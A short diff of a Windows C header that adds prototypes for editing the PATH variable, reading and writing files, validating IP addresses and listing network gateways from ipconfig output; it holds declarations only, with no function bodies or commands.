@@ -29,5 +29,11 @@ void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension);
 int GetPidByName(const char* Name);
 int CheckLetterInArr(char Chr, const char* Arr);
 BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
+DWORD AddPathToEnvVariable(const WCHAR* NewPathToAdd);
 int VerfifyDepDirs(WCHAR* AppDataPath);
 int VerfifyDepFiles(const char* FileHostIp, WCHAR* AppDataPath);
+int OperateOnFile(char* FilePath, HANDLE* FileHandle, PVOID* FileData, 
+    ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm);
+BOOL IsValidIp(char* Address);
+char* ExtractGateways(char* IpConfigOutput);
+char* GetGatewayList();
